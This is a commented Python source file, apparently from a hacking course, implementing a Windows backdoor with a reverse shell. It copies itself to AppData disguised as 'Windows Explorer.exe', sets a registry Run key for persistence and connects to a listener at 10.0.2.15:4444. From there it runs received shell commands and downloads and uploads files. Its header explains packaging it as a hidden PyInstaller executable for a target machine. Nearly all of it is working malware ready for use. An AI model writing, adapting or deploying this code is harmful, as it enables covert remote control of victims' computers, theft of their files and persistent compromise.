#!/usr/bin/env python

# This application needs to run from the target machine
# -------------------------------------UPDATE-------------------------------------
# This application is meant to run as an executable from the target machine
# To do so, you must have installed the python for the same OS as the target machine
# Install PyInstaller with pip: python -m pip pyinstaller
# Create the executable file:   python -m PyInstaller <file>.py --onefile --noconsole
# The executable that needs to run from target machine is located in created dist directory

import socket      # a way of connecting two nodes on a network to communicate with each other.
import subprocess  # function for shell commands
import json        # a lightweight data interchange format
import os          # manipulate paths
import base64      # functions for encoding binary data to printable ASCII characters and decoding such encodings back to binary data
import sys         # provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter
import shutil      # copy the content of source file to destination file or directory

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a socket object
        self.connection.connect((ip, port))                                  # connect to specified ip/port

    # function that copies the executable file to a specific path and makes it run on startup of system
    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"   # set the location to copy file in the AppFile directory under the name Windows Explorer.exe
        if not os.path.exists(evil_file_location):                              # if path doesnt already exist
            shutil.copyfile(sys.executable, evil_file_location)                 # copy current file to file location
            # add this executable on system startup
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    # function that sends json objects through socket connection
    def reliable_send(self, data):
        try:
            json_data = json.dumps(data.decode('utf-8')).encode('utf-8')
        except UnicodeDecodeError:
            json_data = json.dumps(str(data)).encode('utf-8')
        except AttributeError:
            json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    # function that receives json objects through socket connection
    def reliable_receive(self):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except json.decoder.JSONDecodeError:  # if didn't receive the whole package yet, wait
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)


try:
    my_backdoor = Backdoor("10.0.2.15", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()